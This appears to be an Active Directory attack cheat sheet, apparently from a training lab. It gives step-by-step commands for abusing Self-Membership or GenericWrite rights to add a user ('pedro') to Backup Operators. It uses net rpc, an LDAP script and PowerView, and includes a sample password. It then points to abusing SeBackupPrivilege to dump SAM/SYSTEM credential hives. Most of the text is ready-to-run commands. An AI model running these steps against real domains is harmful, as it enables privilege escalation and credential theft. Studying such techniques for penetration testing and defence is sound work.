# 10.01 AddMember Abuse

> Abuse GenericAll/GenericWrite/Self on a group — use `addusertogroup.py` (LDAP) for Self-Membership since `net rpc` can't.

## Overview

If a controlled account has GenericAll, GenericWrite, Self, AllExtendedRights, or Self-Membership over a group, it can add members to that group. The net rpc tool cannot exploit Self-Membership (only full AddMember/GenericWrite); use addusertogroup.py (LDAP-based) or PowerView's Add-DomainGroupMember for Self-Membership scenarios from Linux and Windows respectively.

## Steps

- Confirm the ACE with dacledit.py -principal pedro -target 'Backup Operators'.
- From Windows, confirm with PowerView Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs filtered by pedro's SID.
- Try net rpc group addmem — it will fail with Access Denied for Self-Membership rights.
- From Linux, use addusertogroup.py (ldap3-based) for Self-Membership abuse.
- From Windows, use Add-DomainGroupMember from PowerView instead of net localgroup.
- After adding to Backup Operators, re-authenticate for new group membership to take effect.
- Abuse SeBackupPrivilege to dump SAM/SYSTEM hives.

## Commands

### Check current members

```bash
net rpc group members 'Backup Operators' -U <DOMAIN>.local/pedro%SecuringAD01 -S <TARGET>
```

### Attempt addmem (fails for Self-Membership)

```bash
net rpc group addmem 'Backup Operators' pedro -U <DOMAIN>.local/pedro%SecuringAD01 -S <TARGET>
```

### Add member via LDAP script (Linux)

```bash
python3 addusertogroup.py -d <DOMAIN>.local -g "Backup Operators" -a pedro -u pedro -p SecuringAD01
```

### PowerView — add member (Windows)

```powershell
Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
```

### Verify addition

```bash
net rpc group members 'Backup Operators' -U <DOMAIN>.local/pedro%SecuringAD01 -S <TARGET>
```
